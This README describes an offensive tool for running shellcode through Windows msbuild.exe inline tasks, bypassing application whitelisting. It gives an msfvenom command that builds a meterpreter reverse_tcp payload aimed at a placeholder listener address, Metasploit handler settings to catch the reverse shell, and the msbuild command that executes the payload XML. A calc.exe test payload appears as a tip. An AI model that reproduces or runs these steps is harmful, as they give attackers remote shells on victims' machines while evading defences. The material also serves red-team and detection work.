# msbuild-inline-task


## Usage:

### X64 shellcode 

`msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=x.x.x.x lport=4444 -f csharp`

### Listen Port

```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
```

### change shellcode in xml file (Example："executes x64 shellcode.xml")

`C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe shellcode_x64.xml`


## tips

```
use windows/exec
set CMD calc.exe
set EXITFUNC thread
generate -f csharp
```

Author: Casey Smith, Twitter: @subTee

License: BSD 3-Clause

More details:

https://3gstudent.github.io/3gstudent.github.io/Use-MSBuild-To-Do-More/
